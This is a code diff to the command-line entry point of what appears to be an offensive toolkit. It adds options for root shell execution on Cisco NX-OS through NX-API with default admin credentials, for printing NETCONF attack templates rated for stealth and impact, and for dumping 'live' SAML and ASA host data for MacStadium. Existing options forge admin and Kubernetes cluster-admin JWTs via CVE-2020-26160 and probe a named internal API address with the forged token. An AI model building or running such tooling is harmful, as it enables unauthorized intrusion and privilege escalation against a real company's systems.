@@ -138,11 +138,17 @@ except ImportError:
     CiscoAPIEnum = None
 
 try:
-    from cisco_nxos_guestshell_re import NXOSGuestshellRE
+    from cisco_nxos_guestshell_re import (
+        GuestShellRE as NXOSGuestshellRE,
+        NXAPIBashExec, GuestshellRootfsInject, NETCONFAttackPrimitives,
+    )
     HAS_GUESTSHELL = True
 except ImportError:
     HAS_GUESTSHELL = False
     NXOSGuestshellRE = None
+    NXAPIBashExec = None
+    GuestshellRootfsInject = None
+    NETCONFAttackPrimitives = None
 
 try:
     from cisco_cstp_attack import (
@@ -878,6 +884,12 @@ def main():
     parser.add_argument('--orka-oidc', action='store_true', help='Orka3 OIDC flow RE + JWT forge (CVE-2020-26160, empty secret)')
     parser.add_argument('--orka-jwt', action='store_true', help='Analyze + forge MacStadium JWT (HS256 empty-secret)')
     parser.add_argument('--orka-binary-re', action='store_true', help='Print orka3 binary RE findings summary')
+    parser.add_argument('--orka-jwt-re', action='store_true', help='CVE-2020-26160 analysis + function addresses + .rodata secrets')
+    parser.add_argument('--nxapi-bash', metavar='HOST', help='NX-API type:bash root exec probe (book: NX-OS Programmability ch-nxapi-cli)')
+    parser.add_argument('--nxapi-bash-user', default='admin', help='NX-API username (default: admin)')
+    parser.add_argument('--nxapi-bash-pass', default='admin', help='NX-API password (default: admin)')
+    parser.add_argument('--netconf-patterns', action='store_true', help='Print NETCONF attack pattern templates (confirmed-commit, lock, DME)')
+    parser.add_argument('--saml-metadata', action='store_true', help='Print live MacStadium SAML SP metadata constants')
     parser.add_argument('--forge-admin', action='store_true', help='Forge admin@macstadium.com JWT token')
     parser.add_argument('--forge-masters', action='store_true', help='Forge system:masters JWT for K8s cluster-admin')
     parser.add_argument('--orka-k8s', metavar='PATH', default='/api/v1/namespaces', help='Probe K8s API at 10.221.188.19:6443 with forged token')
@@ -1230,6 +1242,53 @@ def main():
         else:
             result = get_binary_re_findings()
             print(json.dumps(result, indent=2, default=str))
+
+    elif getattr(args, 'orka_jwt_re', False):
+        ablation.banner()
+        if not HAS_CSTP:
+            print("[-] cisco_cstp_attack module not available")
+        else:
+            print("[*] orka3 JWT RE — CVE-2020-26160 + function addresses + .rodata secrets")
+            result = analyze_orka_jwt()
+            print(json.dumps(result, indent=2, default=str))
+
+    elif getattr(args, 'nxapi_bash', False):
+        ablation.banner()
+        if not HAS_GUESTSHELL or NXAPIBashExec is None:
+            print("[-] cisco_nxos_guestshell_re module not available or NXAPIBashExec missing")
+        else:
+            host = args.nxapi_bash
+            user = getattr(args, 'nxapi_bash_user', 'admin')
+            pwd  = getattr(args, 'nxapi_bash_pass', 'admin')
+            print(f"[*] NX-API type:bash probe: {host} (user={user})")
+            executor = NXAPIBashExec(host, username=user, password=pwd)
+            result = executor.run()
+            print(json.dumps(result, indent=2, default=str))
+
+    elif getattr(args, 'netconf_patterns', False):
+        ablation.banner()
+        if not HAS_GUESTSHELL or NETCONFAttackPrimitives is None:
+            print("[-] NETCONFAttackPrimitives not available")
+        else:
+            patterns = NETCONFAttackPrimitives().get_attack_patterns()
+            for name, p in patterns.items():
+                print(f"\n{'='*60}")
+                print(f"[{name}]  {p['description']}")
+                if 'stealth' in p:
+                    print(f"  Stealth: {p['stealth']}")
+                if 'impact' in p:
+                    print(f"  Impact: {p['impact']}")
+                print(f"\n{p['template']}")
+
+    elif getattr(args, 'saml_metadata', False):
+        ablation.banner()
+        if not HAS_CSTP:
+            print("[-] cisco_cstp_attack module not available")
+        else:
+            print("[*] MacStadium SAML SP metadata (live, confirmed 2026-08-13)")
+            print(json.dumps(MACSTADIUM_SAML, indent=2))
+            print("\n[*] MacStadium ASA hosts")
+            print(json.dumps(MACSTADIUM_ASA, indent=2))
 
     elif getattr(args, 'forge_admin', False):
         if not HAS_ORKA_OIDC:
